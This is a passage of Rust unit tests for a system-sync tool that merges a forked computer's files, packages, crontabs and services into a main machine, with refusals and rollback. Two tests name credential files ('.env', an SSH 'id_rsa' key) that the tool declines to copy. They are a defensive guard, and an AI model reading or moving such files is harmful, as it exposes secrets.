        assert_eq!(c.files["/root/.bashrc"].0, b"export X=1\n");
        assert_eq!(c.hooks, ["npm run migrate", "npm test"]);
        assert_eq!(c.pids["web"], 200);
        // No bundle is left behind, and the temporary ref was dropped.
        assert!(c.files.keys().all(|p| !p.contains("silo-keep")));
    });
    // The look ahead and the keep each drop their own temporary ref.
    assert_eq!(world.logged("git_drop_ref"), 2);
    assert_eq!(journal.pending("main").unwrap(), None);
    assert_eq!(journal.latest_undoable("main").unwrap().id, "cp1");
}

#[test]
fn the_lane_is_held_for_the_whole_apply_and_not_while_restoring() {
    let world = simple_world();
    let (_dir, journal) = journal();
    let hooks = Hooks {
        after: vec!["fail".into()],
        ..Hooks::default()
    };
    let st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
    run(&world, &st, &journal, &request(hooks)).unwrap_err();
    let held = world.held_at.lock().unwrap().clone();
    assert!(held.iter().any(|(t, h)| t == "hook" && *h), "{held:?}");
    assert!(held.iter().any(|(t, h)| t == "restore" && !h), "{held:?}");
    // Main is captured after the lane is taken.
    assert_eq!(world.holds.load(Ordering::SeqCst), 0);
}

#[test]
fn a_divergent_keep_stops_before_anything_changes() {
    let world = simple_world();
    world.put("main", "/root/.bashrc", "main edited");
    let (_dir, journal) = journal();
    let outcome = run(
        &world,
        &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
        &journal,
        &request(Hooks::default()),
    )
    .unwrap();
    let refusal = refused(outcome);
    assert_eq!(refusal.reason, "choices-needed");
    assert_eq!(refusal.conflicts[0].item, "/root/.bashrc");
    for tag in [
        "pkg_install",
        "git_merge",
        "service_restart",
        "hook",
        "file_write",
    ] {
        assert_eq!(world.logged(tag), 0, "{tag} ran");
    }
    world.with("main", |c| {
        assert_eq!(c.files["/root/.bashrc"].0, b"main edited")
    });
    // A refusal is decided before a checkpoint is taken, so it creates nothing.
    assert_eq!(world.logged("checkpoint"), 0);
    assert_eq!(journal.latest_undoable("main"), None);
    assert_eq!(journal.pending("main").unwrap(), None);
}

/// The fork-time record an export carried, stored for an imported computer and read back the way
/// a keep reads it, as the base of a store whose fork and main are the given captures.
fn store_from_imported_record(sender_base: &str, fork: &str, main: &str) -> Store {
    use crate::changes::store::{Slot, Store as Stored};
    use std::io::Write;
    let dir = tempfile::tempdir().unwrap();
    let archive_copy = dir.path().join("base.tsv.gz");
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    encoder.write_all(mt(sender_base).as_bytes()).unwrap();
    std::fs::write(&archive_copy, encoder.finish().unwrap()).unwrap();
    let receiver = Stored::new(dir.path().join("receiver"));
    receiver
        .put_imported_base("imported-id", &archive_copy, "2026-11-07T10:00:00Z")
        .unwrap();
    let (base, meta) = receiver.get("imported-id", Slot::Base).unwrap().unwrap();
    assert_eq!((meta.source, meta.origin), (None, None));
    assert_eq!(receiver.fork_link("imported-id", "imported"), None);
    Store {
        base,
        manifests: BTreeMap::from([("fork".to_owned(), mt(fork)), ("main".to_owned(), mt(main))]),
        fork_later: None,
        fork_captures: AtomicUsize::new(0),
        main_later: None,
        main_captures: AtomicUsize::new(0),
    }
}

#[test]
fn an_imported_computer_is_kept_into_the_receivers_main_three_way() {
    let world = simple_world();
    let (_dir, journal) = journal();
    // The sender's fork changed .bashrc; the receiver's main still has what the fork started from.
    let st = store_from_imported_record(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
    let outcome = run(&world, &st, &journal, &request(Hooks::default())).unwrap();
    assert!(matches!(outcome, Outcome::Kept(_)), "{outcome:?}");
    world.with("main", |c| {
        assert_eq!(c.files["/root/.bashrc"].0, b"export X=1\n")
    });
}

#[test]
fn a_file_the_receiver_changed_on_main_conflicts_with_the_imported_computers_change() {
    let world = simple_world();
    world.put("main", "/root/.bashrc", "the receiver edited it");
    let (_dir, journal) = journal();
    let st = store_from_imported_record(SIMPLE_BASE, SIMPLE_FORK, "F\t/root/.bashrc\t21\t9\tdd\n");
    let refusal = refused(run(&world, &st, &journal, &request(Hooks::default())).unwrap());
    assert_eq!(refusal.reason, "choices-needed");
    assert_eq!(refusal.conflicts[0].item, "/root/.bashrc");
    assert_eq!(world.logged("checkpoint"), 0);
    world.with("main", |c| {
        assert_eq!(c.files["/root/.bashrc"].0, b"the receiver edited it")
    });
}

#[test]
fn a_file_the_collector_could_not_hash_is_a_conflict_when_main_differs() {
    let world = simple_world();
    let base = "F\t/root/.bashrc\t10\t1\t-\n";
    let (_dir, journal) = journal();
    let refusal = refused(
        run(
            &world,
            &store(base, SIMPLE_FORK, base),
            &journal,
            &request(Hooks::default()),
        )
        .unwrap(),
    );
    assert_eq!(refusal.reason, "choices-needed");
}

#[test]
fn an_unreadable_file_is_a_conflict_not_identical() {
    let world = simple_world();
    world.put("main", "/root/.bashrc", "<unreadable>");
    world.put("fork", "/root/.bashrc", "<unreadable>");
    let (_dir, journal) = journal();
    let refusal = refused(
        run(
            &world,
            &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
            &journal,
            &request(Hooks::default()),
        )
        .unwrap(),
    );
    assert!(refusal.conflicts[0].detail.contains("cannot be read"));
}

#[test]
fn commits_that_add_credentials_or_ignored_files_are_refused_with_the_list() {
    let world = simple_world();
    *world.changed_files.lock().unwrap() = vec![
        "src/a.js".into(),
        ".env".into(),
        "keys/id_rsa".into(),
        "ok.md".into(),
    ];
    let (_dir, journal) = journal();
    let outcome = run(
        &world,
        &store(BASE, FORK, BASE),
        &journal,
        &request(Hooks {
            migrate: vec!["m".into()],
            ..Hooks::default()
        }),
    )
    .unwrap();
    let refusal = refused(outcome);
    assert_eq!(refusal.reason, "credentials");
    let items: Vec<&str> = refusal.conflicts.iter().map(|c| c.item.as_str()).collect();
    assert_eq!(items, ["/root/app/.env", "/root/app/keys/id_rsa"]);
    for tag in ["git_merge", "pkg_install", "hook"] {
        assert_eq!(world.logged(tag), 0, "{tag} ran");
    }
    assert_eq!(
        world.logged("git_precheck"),
        0,
        "nothing is fetched into main"
    );
}

#[test]
fn a_conflicting_git_merge_is_reported_and_main_is_untouched() {
    let world = simple_world();
    *world.git_state.lock().unwrap() =
        "conflict\nCONFLICT (content): Merge conflict in a.js\n".into();
    *world.changed_files.lock().unwrap() = vec!["migrations/1.sql".into()];
    let (_dir, journal) = journal();
    let hooks = Hooks {
        migrate: vec!["m".into()],
        ..Hooks::default()
    };
    let refusal =
        refused(run(&world, &store(BASE, FORK, BASE), &journal, &request(hooks)).unwrap());
    assert!(refusal
        .conflicts
        .iter()
        .any(|c| c.kind == "git" && c.detail.contains("a.js")));
    assert_eq!(world.logged("git_merge"), 0);
    assert_eq!(
        world.logged("git_drop_ref"),
        1,
        "the temporary ref is dropped on a refusal"
    );
}

#[test]
fn a_git_that_cannot_test_the_merge_refuses_instead_of_going_ahead() {
    let world = simple_world();
    *world.git_state.lock().unwrap() = "unsupported".into();
    *world.changed_files.lock().unwrap() = vec!["migrations/1.sql".into()];
    let (_dir, journal) = journal();
    let hooks = Hooks {
        migrate: vec!["m".into()],
        ..Hooks::default()
    };
    let refusal =
        refused(run(&world, &store(BASE, FORK, BASE), &journal, &request(hooks)).unwrap());
    assert_eq!(refusal.reason, "choices-needed");
    assert!(refusal.conflicts[0].detail.contains("merge-tree"));
}

#[test]
fn a_database_change_is_carried_only_with_a_migrate_step_and_migration_files_or_data_ok() {
    let (_dir, journal) = journal();
    let try_keep = |hooks: Hooks, changed: &[&str], data_ok: bool| {
        let world = simple_world();
        *world.changed_files.lock().unwrap() = changed.iter().map(|s| (*s).to_owned()).collect();
        let mut req = request(hooks);
        req.data_ok = data_ok;
        run(&world, &store(BASE, FORK, BASE), &journal, &req).unwrap()
    };
    // Nothing migrates it.
    let refusal = refused(try_keep(Hooks::default(), &["src/a.js"], false));
    assert_eq!(refusal.reason, "database");
    assert!(refusal.hint.contains("replace main"));
    assert!(refusal.hint.contains("silo replace-main"), "{}", refusal.hint);
    // A migrate step but no migration file changed: still refused.
    let hooks = Hooks {
        migrate: vec!["make migrate".into()],
        ..Hooks::default()
    };
    assert_eq!(
        refused(try_keep(hooks.clone(), &["docs/migration-guide.md"], false)).reason,
        "database"
    );
    // Migration files but no step: refused.
    assert_eq!(
        refused(try_keep(Hooks::default(), &["db/migrations/1.sql"], false)).reason,
        "database"
    );
    // Both: carried.
    assert!(matches!(
        try_keep(hooks.clone(), &["db/migrations/1.sql"], false),
        Outcome::Kept(_)
    ));
    // The explicit flag lifts it.
    assert!(matches!(
        try_keep(Hooks::default(), &["src/a.js"], true),
        Outcome::Kept(_)
    ));
}

#[test]
fn a_dry_run_reports_the_plan_and_leaves_main_as_it_was() {
    let world = simple_world();
    *world.changed_files.lock().unwrap() = vec!["db/migrations/1.sql".into()];
    let (_dir, journal) = journal();
    let mut req = request(Hooks {
        migrate: vec!["m".into()],
        ..Hooks::default()
    });
    req.dry_run = true;
    let outcome = run(&world, &store(BASE, FORK, BASE), &journal, &req).unwrap();
    let Outcome::DryRun(report) = outcome else {
        panic!("{outcome:?}")
    };
    assert!(report
        .summary
        .iter()
        .any(|l| l.contains("will merge packages: jq 1.7")));
    assert_eq!(world.logged("checkpoint"), 0);
    assert_eq!(world.logged("hold"), 0);
    assert_eq!(world.logged("pkg_install"), 0);
    // Its temporary bundle and ref are gone from both computers.
    assert_eq!(world.logged("git_drop_ref"), 1);
    world.with("main", |c| {
        assert!(c.files.keys().all(|p| !p.contains("silo-keep")))
    });
    world.with("fork", |c| {
        assert!(c.files.keys().all(|p| !p.contains("silo-keep")))
    });
}

#[test]
fn a_keep_pinned_to_a_reviewed_diff_refuses_when_the_fork_is_not_that_diff() {
    let world = simple_world();
    let (_dir, journal) = journal();
    let st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
    let mut req = request(Hooks::default());
    req.reviewed = Some("0".repeat(64));
    let refusal = refused(run(&world, &st, &journal, &req).unwrap());
    assert_eq!(refusal.reason, "changed");
    assert_eq!(world.logged("checkpoint"), 0);
    // With the right digest it goes ahead.
    let Outcome::DryRun(report) = ({
        let mut dry = request(Hooks::default());
        dry.dry_run = true;
        run(&world, &st, &journal, &dry).unwrap()
    }) else {
        panic!()
    };
    let mut pinned = request(Hooks::default());
    pinned.reviewed = report.review_digest;
    assert!(matches!(
        run(&world, &st, &journal, &pinned).unwrap(),
        Outcome::Kept(_)
    ));
}

#[test]
fn a_fork_that_moves_while_it_is_read_stops_the_keep() {
    let world = simple_world();
    let (_dir, journal) = journal();
    let mut st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
    st.fork_later = Some(mt("F\t/root/.bashrc\t13\t3\tcc\n"));
    let refusal = refused(run(&world, &st, &journal, &request(Hooks::default())).unwrap());
    assert_eq!(refusal.reason, "changed");
    assert_eq!(world.logged("file_write"), 0);
    assert_eq!(journal.latest_undoable("main"), None);
}

#[test]
fn churn_the_keep_does_not_read_does_not_refuse_it() {
    let world = simple_world();
    let (_dir, journal) = journal();
    let mut st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
    st.fork_later = Some(mt(&format!(
        "{}F\t/root/Library/Preferences/com.apple.noise.plist\t9\t7\tzz\n",
        &SIMPLE_FORK
    )));
    assert!(matches!(
        run(&world, &st, &journal, &request(Hooks::default())).unwrap(),
        Outcome::Kept(_)
    ));
}

#[test]
fn a_file_the_keep_copies_changing_between_the_looks_refuses_it() {
    let world = simple_world();
    let (_dir, journal) = journal();
    let mut st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
    st.fork_later = Some(mt(&SIMPLE_FORK.replace("\tbb\n", "\tbc\n")));
    let refusal = refused(run(&world, &st, &journal, &request(Hooks::default())).unwrap());
    assert_eq!(refusal.reason, "changed");
}

#[test]
fn what_the_keep_writes_is_what_it_read_from_the_fork_before_main_was_touched() {
    let world = simple_world();
    let (_dir, journal) = journal();
    let order = |w: &World| {
        let log = w.log.lock().unwrap();
        let read = log
            .iter()
            .position(|l| l == "fork:file_read:/root/.bashrc")
            .unwrap();
        let write = log
            .iter()
            .position(|l| l == "main:file_write:/root/.bashrc")
            .unwrap();
        (read, write)
    };
    run(
        &world,
        &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
        &journal,
        &request(Hooks::default()),
    )
    .unwrap();
    let (read, write) = order(&world);
    assert!(read < write);
    assert_eq!(
        world.logged("file_read"),
        1,
        "read once, from the staged copy"
    );
}

#[test]
fn a_destination_behind_a_link_or_a_folder_is_refused() {
    let world = simple_world();
    world.bad_dest.lock().unwrap().push("/root/.bashrc".into());
    let (_dir, journal) = journal();
    let refusal = refused(
        run(
            &world,
            &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
            &journal,
            &request(Hooks::default()),
        )
        .unwrap(),
    );
    assert_eq!(refusal.conflicts[0].kind, "destination");
    assert_eq!(world.logged("file_write"), 0);
}

#[test]
fn links_are_copied_as_links_and_a_link_to_a_credential_is_not_kept() {
    let base = "";
    let fork = "L\t/root/bin/tool\t0\t1\t../real/tool\nL\t/root/cfg\t0\t1\t/root/.ssh/id_rsa\n";
    let world = World::new(Os::Linux, &["fork", "main"]);
    world.with("fork", |c| {
        c.links
            .insert("/root/bin/tool".into(), "../real/tool".into());
        c.links
            .insert("/root/cfg".into(), "/root/.ssh/id_rsa".into());
    });
    let (_dir, journal) = journal();
    let outcome = run(
        &world,
        &store(base, fork, base),
        &journal,
        &request(Hooks::default()),
    )
    .unwrap();
    let Outcome::Kept(report) = outcome else {
        panic!("{outcome:?}")
    };
    world.with("main", |c| {
        assert_eq!(
            c.links.get("/root/bin/tool").map(String::as_str),
            Some("../real/tool")
        );
        assert!(!c.links.contains_key("/root/cfg"));
    });
    assert!(
        report.notes.iter().any(|n| n.contains("credential")),
        "{:?}",
        report.notes
    );
    assert_eq!(world.logged("file_read"), 0, "a link is never read through");
}

fn dirty_fork(code: &str, rel: &str) -> String {
    format!("GIT\t/root/app\tbbb\tmain\t1\t0\nGITF\t/root/app\t{code}\t{rel}\n")
}

#[test]
fn uncommitted_files_are_three_way_checked_against_the_fork_point_even_if_main_committed() {
    let base = "GIT\t/root/app\taaa\tmain\t0\t0\n";
    // Main committed a different edit of a.txt: its working file differs from the fork-point blob.
    let world = World::new(Os::Linux, &["fork", "main"]);
    world.put("fork", "/root/app/a.txt", "fork edit");
    world
        .file_states
        .lock()
        .unwrap()
        .insert(("main".into(), "a.txt".into()), "b1 m3".into());
    world
        .file_states
        .lock()
        .unwrap()
        .insert(("fork".into(), "a.txt".into()), "b1 f2".into());
    let (_dir, journal) = journal();
    let refusal = refused(
        run(
            &world,
            &store(base, &dirty_fork("_M", "a.txt"), base),
            &journal,
            &request(Hooks::default()),
        )
        .unwrap(),
    );
    assert_eq!(refusal.conflicts[0].item, "/root/app/a.txt");
    // Main left it alone: the edit is carried.
    let world = World::new(Os::Linux, &["fork", "main"]);
    world.put("fork", "/root/app/a.txt", "fork edit");
    world
        .file_states
        .lock()
        .unwrap()
        .insert(("main".into(), "a.txt".into()), "b1 b1".into());
    world
        .file_states
        .lock()
        .unwrap()
        .insert(("fork".into(), "a.txt".into()), "b1 f2".into());
    let outcome = run(
        &world,
        &store(base, &dirty_fork("_M", "a.txt"), base),
        &journal,
        &request(Hooks::default()),
    )
    .unwrap();
    assert!(matches!(outcome, Outcome::Kept(_)), "{outcome:?}");
    world.with("main", |c| {
        assert_eq!(c.files["/root/app/a.txt"].0, b"fork edit")
    });
}

#[test]
fn uncommitted_deletes_and_renames_remove_the_old_path_and_never_read_it() {
    let base = "GIT\t/root/app\taaa\tmain\t0\t0\n";
    let world = World::new(Os::Linux, &["fork", "main"]);
    world.put("main", "/root/app/gone.txt", "kept until now");
    world.put("main", "/root/app/old.txt", "old");
    world.put("fork", "/root/app/new.txt", "renamed");
    let states = |w: &World| {
        let mut s = w.file_states.lock().unwrap();
        s.insert(("main".into(), "gone.txt".into()), "b1 b1".into());
        s.insert(("main".into(), "old.txt".into()), "b2 b2".into());
        s.insert(("main".into(), "new.txt".into()), "- -".into());
        s.insert(("fork".into(), "new.txt".into()), "- f9".into());
    };
    states(&world);
    let fork = "GIT\t/root/app\tbbb\tmain\t2\t0\nGITF\t/root/app\t_D\tgone.txt\nGITF\t/root/app\tR_\told.txt -> new.txt\n";
    let (_dir, journal) = journal();
    let outcome = run(
        &world,
        &store(base, fork, base),
        &journal,
        &request(Hooks::default()),
    )
    .unwrap();
    assert!(matches!(outcome, Outcome::Kept(_)), "{outcome:?}");
    world.with("main", |c| {
        assert!(!c.files.contains_key("/root/app/gone.txt"));
        assert!(!c.files.contains_key("/root/app/old.txt"));
        assert_eq!(c.files["/root/app/new.txt"].0, b"renamed");
    });
    let reads: Vec<String> = world
        .log
        .lock()
        .unwrap()
        .iter()
        .filter(|l| l.contains("file_read") && !l.contains(".bundle"))
        .cloned()
        .collect();
    assert_eq!(reads, ["fork:file_read:/root/app/new.txt"]);
}

#[test]
fn brew_installs_only_when_it_would_install_the_forks_version() {
    let base = "";
    let fork = "PKG\tbrew\tjq\t1.7\nPKGM\tbrew\tjq\n";
    let world = World::new(Os::Macos, &["fork", "main"]);
    *world.brew.lock().unwrap() = "1.8".into();
    let (_dir, journal) = journal();
    let refusal = refused(
        run(
            &world,
            &store(base, fork, base),
            &journal,
            &request(Hooks::default()),
        )
        .unwrap(),
    );
    assert_eq!(
        refusal.conflicts[0].detail,
        "brew now offers 1.8; the fork has 1.7"
    );
    assert_eq!(refusal.reason, "choices-needed");
    assert_eq!(refusal.conflicts[0].id, "package:brew:jq");
    assert_eq!(refusal.conflicts[0].allowed, [Answer::Main]);
    *world.brew.lock().unwrap() = String::new();
    let refusal = refused(
        run(
            &world,
            &store(base, fork, base),
            &journal,
            &request(Hooks::default()),
        )
        .unwrap(),
    );
    assert!(refusal.conflicts[0]
        .detail
        .contains("brew did not report a version"));
    *world.brew.lock().unwrap() = "1.7".into();
    assert!(matches!(
        run(
            &world,
            &store(base, fork, base),
            &journal,
            &request(Hooks::default())
        )
        .unwrap(),
        Outcome::Kept(_)
    ));
    assert_eq!(scripts::pkg_runner(Os::Macos, "brew"), RunAs::Account);
    assert_eq!(scripts::pkg_runner(Os::Linux, "dpkg"), RunAs::Root);
    assert_eq!(scripts::pkg_runner(Os::Linux, "cargo"), RunAs::Root);
    assert_eq!(scripts::pkg_runner(Os::Linux, "brew"), RunAs::Account);
}

#[test]
fn replayed_package_removals_follow_the_three_way_rule() {
    let base = "PKG\tdpkg\told\t1\nPKGM\tdpkg\told\n";
    let world = simple_world();
    world.with("main", |c| c.pkgs.insert("dpkg old".into(), "1".into()));
    let (_dir, journal) = journal();
    let main = base;
    run(
        &world,
        &store(base, "", main),
        &journal,
        &request(Hooks::default()),
    )
    .unwrap();
    world.with("main", |c| assert!(!c.pkgs.contains_key("dpkg old")));
    assert_eq!(world.logged("pkg_remove"), 1);
}

const CRON_BASE: &str = "CRON\troot\t01\nCRONF\troot\t/var/spool/cron/crontabs/root\n";
const CRON_FORK: &str = "CRON\troot\t02\nCRONF\troot\t/var/spool/cron/crontabs/root\n";
const CRON_MAIN: &str = "CRON\troot\t03\nCRONF\troot\t/var/spool/cron/crontabs/root\n";

#[test]
fn a_crontab_is_merged_by_line_against_the_fork_time_text() {
    let world = World::new(Os::Linux, &["fork", "main"]);
    world.with("fork", |c| {
        c.crontab
            .insert("root".into(), "* * * * * a\n5 1 * * * b\n".into())
    });
    world.with("main", |c| {
        c.crontab.insert(
            "root".into(),
            "* * * * * a\n0 1 * * * b\n0 2 * * * c\n0 3 * * * main-only\n".into(),
        )
    });
    let base = format!("{CRON_BASE}CRONT\troot\t* * * * * a\\n0 1 * * * b\\n0 2 * * * c\\n\n");
    let st = store(&base, CRON_FORK, CRON_MAIN);
    let (_dir, journal) = journal();
    let outcome = run(&world, &st, &journal, &request(Hooks::default())).unwrap();
    assert!(matches!(outcome, Outcome::Kept(_)), "{outcome:?}");
    world.with("main", |c| {
        assert_eq!(
            c.crontab["root"],
            "* * * * * a\n0 3 * * * main-only\n5 1 * * * b\n"
        )
    });
}

#[test]
fn a_parked_original_is_the_base_for_a_quiet_forks_crontab() {
    // The fork's own crontab was parked at fork time; the parked original is main's then.
    let base = "QCRON\troot\t03\t* * * * * a\\n0 2 * * * c\\n\nCRONF\troot\t/var/spool/cron/crontabs/root\n";
    let fork_text = "* * * * * a\n0 2 * * * c\n7 7 * * * new\n";
    let world = World::new(Os::Linux, &["fork", "main"]);
    world.with("fork", |c| {
        c.crontab.insert("root".into(), fork_text.into())
    });
    world.with("main", |c| {
        c.crontab
            .insert("root".into(), "* * * * * a\n0 2 * * * c\n".into())
    });
    let (_dir, journal) = journal();
    // Main still has the parked original (digest 03): the fork's crontab is taken.
    run(
        &world,
        &store(base, CRON_FORK, CRON_MAIN),
        &journal,
        &request(Hooks::default()),
    )
    .unwrap();
    world.with("main", |c| {
        assert!(c.crontab["root"].contains("7 7 * * * new"))
    });
    // Main edited its crontab since: merged by line against the parked original.
    let world = World::new(Os::Linux, &["fork", "main"]);
    world.with("fork", |c| {
        c.crontab.insert("root".into(), fork_text.into())
    });
    world.with("main", |c| {
        c.crontab.insert(
            "root".into(),
            "* * * * * a\n0 2 * * * c\n9 9 * * * main\n".into(),
        )
    });
    let main_now = "CRON\troot\t99\nCRONF\troot\t/var/spool/cron/crontabs/root\n";
    run(
        &world,
        &store(base, CRON_FORK, main_now),
        &journal,
        &request(Hooks::default()),
    )
    .unwrap();
    world.with("main", |c| {
        assert_eq!(
            c.crontab["root"],
            "* * * * * a\n0 2 * * * c\n9 9 * * * main\n7 7 * * * new\n"
        )
    });
}

#[test]
fn an_unchanged_main_crontab_takes_the_forks_whole() {
    let world = World::new(Os::Linux, &["fork", "main"]);
    world.with("fork", |c| {
        c.crontab.insert("root".into(), "* * * * * new\n".into())
    });
    world.with("main", |c| {
        c.crontab.insert("root".into(), "* * * * * old\n".into())
    });
    let (_dir, journal) = journal();
    run(
        &world,
        &store(CRON_BASE, CRON_FORK, CRON_BASE),
        &journal,
        &request(Hooks::default()),
    )
    .unwrap();
    world.with("main", |c| assert_eq!(c.crontab["root"], "* * * * * new\n"));
}

#[test]
fn macos_uses_launchctl_and_recreates_launch_agents_on_the_other_side() {
    let base = "LAGENT\tuser\tdev.old\tc:o\t/Users/a/Library/LaunchAgents/dev.old.plist\n";
    let fork = "LAGENT\tuser\tdev.new\tbb\t/Users/a/Library/LaunchAgents/dev.new.plist\n";
    let world = World::new(Os::Macos, &["fork", "main"]);
    world.put(
        "fork",
        "/Users/a/Library/LaunchAgents/dev.new.plist",
        "<plist/>",
    );
    world.put("main", "/Users/a/Library/LaunchAgents/dev.old.plist", "o");
    let (_dir, journal) = journal();
    let hooks = Hooks {
        restart: vec!["dev.web".into()],
        ..Hooks::default()
    };
    let outcome = run(&world, &store(base, fork, base), &journal, &request(hooks)).unwrap();
    let Outcome::Kept(report) = outcome else {
        panic!("{outcome:?}")
    };
    world.with("main", |c| {
        assert!(c
            .files
            .contains_key("/Users/a/Library/LaunchAgents/dev.new.plist"));
        assert!(!c
            .files
            .contains_key("/Users/a/Library/LaunchAgents/dev.old.plist"));
    });
    assert_eq!(world.logged("agent_load"), 1);
    assert_eq!(world.logged("agent_unload"), 1);
    assert!(report
        .steps
        .iter()
        .any(|s| s.starts_with("restart dev.web")));
    assert!(scripts::service_restart(Os::Macos, "x")
        .script
        .contains("launchctl kickstart"));
    assert!(scripts::service_restart(Os::Linux, "x")
        .script
        .contains("systemctl"));
    assert!(scripts::pkg_install(Os::Macos, "brew", &["jq".into()])
        .unwrap()
        .script
        .contains("brew install"));
    assert!(scripts::pkg_install(Os::Linux, "dpkg", &["jq=1".into()])
        .unwrap()
        .script
        .contains("apt-get install -y -qq --"));
}

#[test]
fn a_launch_agent_that_will_not_load_fails_the_keep_and_main_is_put_back() {
    let base = "";
    let fork = "LAGENT\tuser\tdev.new\tbb\t/Users/a/Library/LaunchAgents/dev.new.plist\n";
    let world = World::new(Os::Macos, &["fork", "main"]);
    world.put(
        "fork",
        "/Users/a/Library/LaunchAgents/dev.new.plist",
        "<plist/>",
    );
    *world.fail_tag.lock().unwrap() = Some("agent_load");
    let (_dir, journal) = journal();
    let error = run(
        &world,
        &store(base, fork, base),
        &journal,
        &request(Hooks::default()),
    )
    .unwrap_err();
    assert!(error.contains("Loading launch agent"), "{error}");
    assert!(error.contains("put back"), "{error}");
    world.with("main", |c| assert!(c.files.is_empty()));
    assert_eq!(journal.latest_undoable("main"), None);
}

#[test]
fn a_service_that_does_not_come_back_as_a_new_process_fails_the_keep_and_main_is_put_back() {
    let world = simple_world();
    *world.stuck.lock().unwrap() = true;
    let (_dir, journal) = journal();
    let hooks = Hooks {
        restart: vec!["web".into()],
        ..Hooks::default()
    };
    let error = run(
        &world,
        &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
        &journal,
        &request(hooks),
    )
    .unwrap_err();
    assert!(
        error.contains("did not come back as a new running process"),
        "{error}"
    );
    assert!(error.contains("put back"), "{error}");
    world.with("main", |c| assert_eq!(c.files["/root/.bashrc"].0, b"old"));
}

#[test]
fn a_failing_step_puts_main_back_and_its_checkpoint_is_not_undoable() {
    let world = simple_world();
    world.with("main", |c| {
        c.files
            .insert("/root/keepme".into(), (b"k".to_vec(), "644".into()))
    });
    let (_dir, journal) = journal();
    let hooks = Hooks {
        after: vec!["fail please".into()],
        ..Hooks::default()
    };
    let error = run(
        &world,
        &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
        &journal,
        &request(hooks),
    )
    .unwrap_err();
    assert!(error.contains("put back"), "{error}");
    world.with("main", |c| {
        assert_eq!(c.files["/root/.bashrc"].0, b"old");
        assert!(c.files.contains_key("/root/keepme"));
    });
    assert_eq!(world.logged("restore"), 1);
    assert_eq!(journal.pending("main").unwrap(), None);
    assert_eq!(journal.records("main")[0].state, State::Consumed);
    assert_eq!(
        super::undo(
            &Fake(world.clone()),
            &store("", "", ""),
            &journal,
            "main",
            WAIT
        )
        .unwrap(),
        UndoOutcome::NothingToUndo {
            computer: "main".into()
        }
    );
}

fn fold_request(
    status: silo_api::methods::keep::FoldRequestStatus,
) -> silo_api::methods::keep::FoldRequest {
    silo_api::methods::keep::FoldRequest {
        id: "fr-1".into(),
        fork_id: "fork".into(),
        target: "main".into(),
        created_at: "t".into(),
        review_digest: "d1".into(),
        summary: "s".into(),
        status,
        counts: Default::default(),
        keep_id: None,
        resolved_at: None,
        keeping_since_ms: None,
        closed_reason: None,
        approval_id: None,
    }
}

#[test]
fn a_request_keep_result_has_the_typed_shape_for_kept_and_refused_outcomes() {
    use silo_api::methods::{keep::FoldRequestStatus, review_requests::ChangesRequestsKeepResult};
    let request = fold_request(FoldRequestStatus::Kept);
    let kept = super::Outcome::Kept(super::Report {
        fork: "fork".into(),
        target: "main".into(),
        checkpoint: Some("cp1".into()),
        review_digest: Some("d1".into()),
        ..Default::default()
    });
    let value = super::service::request_keep_result(&kept, &request).unwrap();
    let typed: ChangesRequestsKeepResult = serde_json::from_value(value).unwrap();
    assert_eq!((typed.status.as_str(), typed.request), ("kept", request));
    let refused = super::refused_early(
        &Request {
            fork: "fork".into(),
            ..Default::default()
        },
        "main",
        "d2",
    );
    let open = fold_request(FoldRequestStatus::Open);
    let value = super::service::request_keep_result(&refused, &open).unwrap();
    let typed: ChangesRequestsKeepResult = serde_json::from_value(value).unwrap();
    assert_eq!(typed.status, "refused");
    assert_eq!(typed.refusal.unwrap().reason, "changed");
}

/// A request whose keep started, and the keep journal that keep wrote to.
struct Settling {
    _dirs: (tempfile::TempDir, tempfile::TempDir),
    requests: crate::fold_requests::Store,
    journal: Journal,
    checkpoint: CheckpointRef,
    request: silo_api::methods::keep::FoldRequest,
}

fn settling(id: &str) -> Settling {
    use silo_api::methods::keep::FoldRequestStatus;
    let dir = tempfile::tempdir().unwrap();
    let requests = crate::fold_requests::Store::new(dir.path());
    let (journal_dir, journal) = journal();
    let env = Fake(World::new(Os::Linux, &["fork", "main"]));
    let checkpoint = env
        .checkpoint_before_keep("main", "Before keep of fork")
        .unwrap();
    journal.record_pending("main", &checkpoint).unwrap();
    journal.tag("main", &checkpoint.id, "fork", "d1").unwrap();
    let mut request = fold_request(FoldRequestStatus::Keeping);
    request.id = id.into();
    request.keeping_since_ms = Some(0);
    requests.put(&request).unwrap();
    Settling {
        _dirs: (dir, journal_dir),
        requests,
        journal,
        checkpoint,
        request,
    }
}

fn status_of(world: &Settling) -> silo_api::methods::keep::FoldRequestStatus {
    world
        .requests
        .get(&world.request.id)
        .unwrap()
        .unwrap()
        .status
}

#[test]
fn a_keeping_request_is_left_alone_while_its_keep_is_pending_and_settled_when_it_finished() {
    use silo_api::methods::keep::FoldRequestStatus;
    let world = settling("fr-settle-a");
    world
        .journal
        .begin(&Entry {
            fork: "fork".into(),
            target: "main".into(),
            checkpoint_id: world.checkpoint.id.clone(),
            checkpoint_name: world.checkpoint.name.clone(),
            checkpoint_scope: "full".into(),
        })
        .unwrap();
    let settle = || super::service::settle_request(&world.requests, &world.journal, &world.request);
    assert!(settle().is_none());
    assert_eq!(status_of(&world), FoldRequestStatus::Keeping);
    world.journal.clear("main");
    world
        .journal
        .set_state(
            "main",
            &world.checkpoint.id,
            super::journal::State::Undoable,
        )
        .unwrap();
    let settled = settle().unwrap();
    assert_eq!(settled.status, FoldRequestStatus::Kept);
    assert_eq!(
        settled.keep_id.as_deref(),
        Some(world.checkpoint.id.as_str())
    );
    assert_eq!(world.requests.get("fr-settle-a").unwrap().unwrap(), settled);
    // An open request is never settled this way.
    let open = fold_request(FoldRequestStatus::Open);
